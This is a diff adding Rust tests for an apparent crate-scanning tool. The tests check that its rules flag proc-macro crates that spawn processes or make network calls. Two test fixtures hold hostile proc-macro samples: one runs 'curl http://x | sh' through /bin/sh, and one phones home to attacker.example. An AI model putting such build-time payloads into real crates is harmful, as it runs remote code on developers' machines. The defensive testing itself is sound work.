@@ -277,3 +277,127 @@ pub fn read_key() -> std::io::Result<String> {
     // arbiter for whether the access is legitimate.
     assert_eq!(s.verdict, Stage1Verdict::Suspicious);
 }
+
+#[test]
+fn proc_macro_with_no_dangerous_apis_only_fires_cargo003() {
+    // Plain proc-macro crate (CARGO003) but body is benign — the
+    // new CARGO005/6/7 rules must NOT fire.
+    let cargo_toml = br#"
+[package]
+name = "clean-derive"
+version = "0.1.0"
+
+[lib]
+proc-macro = true
+    "#;
+    let src = b"
+use proc_macro::TokenStream;
+
+#[proc_macro_derive(MyTrait)]
+pub fn derive_my_trait(_input: TokenStream) -> TokenStream {
+    TokenStream::new()
+}
+";
+    let bytes = build_crate(
+        "clean-derive-0.1.0",
+        &[
+            ("Cargo.toml", cargo_toml.as_slice()),
+            ("src/lib.rs", src.as_slice()),
+        ],
+    );
+    let s = analyze(bytes);
+    let ids: std::collections::HashSet<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains("CARGO003"));
+    assert!(!ids.contains("CARGO005"));
+    assert!(!ids.contains("CARGO006"));
+    assert!(!ids.contains("CARGO007"));
+}
+
+#[test]
+fn proc_macro_source_with_process_spawn_fires_cargo005() {
+    let cargo_toml = br#"
+[package]
+name = "evil-derive"
+version = "0.1.0"
+
+[lib]
+proc-macro = true
+    "#;
+    let src = b"
+use proc_macro::TokenStream;
+use std::process::Command;
+
+#[proc_macro_derive(Evil)]
+pub fn derive(_: TokenStream) -> TokenStream {
+    let _ = Command::new(\"/bin/sh\").arg(\"-c\").arg(\"curl http://x | sh\").spawn();
+    TokenStream::new()
+}
+";
+    let bytes = build_crate(
+        "evil-derive-0.1.0",
+        &[
+            ("Cargo.toml", cargo_toml.as_slice()),
+            ("src/lib.rs", src.as_slice()),
+        ],
+    );
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"CARGO005"), "got {ids:?}");
+}
+
+#[test]
+fn proc_macro_source_with_network_fires_cargo007() {
+    let cargo_toml = br#"
+[package]
+name = "phone-home-derive"
+version = "0.1.0"
+
+[lib]
+proc-macro = true
+    "#;
+    let src = b"
+use proc_macro::TokenStream;
+
+#[proc_macro_derive(PhoneHome)]
+pub fn derive(_: TokenStream) -> TokenStream {
+    let _ = reqwest::blocking::get(\"http://attacker.example/x\");
+    TokenStream::new()
+}
+";
+    let bytes = build_crate(
+        "phone-home-derive-0.1.0",
+        &[
+            ("Cargo.toml", cargo_toml.as_slice()),
+            ("src/lib.rs", src.as_slice()),
+        ],
+    );
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"CARGO007"), "got {ids:?}");
+}
+
+#[test]
+fn non_proc_macro_with_network_does_not_fire_cargo007() {
+    // Same `reqwest::` literal but the crate is NOT a proc-macro —
+    // ordinary library code uses reqwest legitimately.
+    let cargo_toml = br#"
+[package]
+name = "ordinary-lib"
+version = "0.1.0"
+    "#;
+    let src = b"
+pub fn fetch() {
+    let _ = reqwest::blocking::get(\"http://example.com\");
+}
+";
+    let bytes = build_crate(
+        "ordinary-lib-0.1.0",
+        &[
+            ("Cargo.toml", cargo_toml.as_slice()),
+            ("src/lib.rs", src.as_slice()),
+        ],
+    );
+    let s = analyze(bytes);
+    let ids: Vec<_> = s.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(!ids.contains(&"CARGO007"), "CARGO007 should be proc-macro-only, got {ids:?}");
+}
